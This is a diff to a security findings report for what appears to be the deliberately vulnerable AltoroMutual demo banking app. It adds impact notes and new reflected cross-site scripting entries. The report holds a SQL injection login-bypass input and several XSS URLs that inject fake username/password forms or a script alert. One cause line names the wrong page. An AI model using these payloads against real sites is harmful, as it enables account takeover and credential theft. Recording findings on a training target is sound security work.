@@ -26,7 +26,7 @@ Report content:
   - while logging in, provide
     - username: asd' or 1=1 --
     - password: anything
-  - Bypass login
+  - Impact: Bypass login
   - cause: DBUtil.isValidUser() method does string concatenation in SQL query
 
 - SQL injection
@@ -130,6 +130,16 @@ Report content:
   - Impact: a user can take privileged actions as an administrator
 
 - Cross site scripting
-  - Go to http://localhost:8080/altoromutual/bank/customize.jsp?lang=%3Cbr%3E%3Cform%3E%3Clabel%3Eevil%20username%3C/label%3E%3Cinput%20type=%27text%27%3E%3Cbr%3E%3Clabel%3Eevil%20password%3C/label%3E%3Cinput%20type=%27password%27%3E%3C/form%3E and observe how an evil form was injected
+  - Go to /altoromutual/bank/customize.jsp?lang=%3Cbr%3E%3Cform%3E%3Clabel%3Eevil%20username%3C/label%3E%3Cinput%20type=%27text%27%3E%3Cbr%3E%3Clabel%3Eevil%20password%3C/label%3E%3Cinput%20type=%27password%27%3E%3Cinput%20type=%27submit%27%3E%3C/form%3E and observe how an evil form was injected
   - Cause: customize.jsp does not sanitize the request parameter before placing it on the DOM
+  - Impact: an attacker can send such link to other users; the link appears as if it is genuine but it can contain an evil form that, when submitted, can cause the victim's data to be stolen
+
+- Cross site scripting
+  - Go to /altoromutual/search.jsp?query=%3Cform%3E%3Clabel%3Eevil+username%3C%2Flabel%3E%3Cinput+type%3D%22text%22%3E%3Cbr%3E%3Clabel%3Eevil+password%3C%2Flabel%3E%3Cinput+type%3D%22password%22%3E%3C%2Fform%3E and observe how an evil form was injected
+  - Cause: customize.jsp does not sanitize the request parameter before placing it on the DOM
+  - Impact: an attacker can send such link to other users; the link appears as if it is genuine but it can contain an evil form that, when submitted, can cause the victim's data to be stolen
+
+- Cross site scripting
+  - Go to /altoromutual/util/serverStatusCheckService.jsp?HostName=%3Cscript%3Ealert(%22XSS%20injected%22)%3C/script%3E
+  - Cause: serverStatusCheckService.jsp does not sanitize the request parameter before placing it on the DOM
   - Impact: an attacker can send such link to other users; the link appears as if it is genuine but it can contain an evil form that, when submitted, can cause the victim's data to be stolen
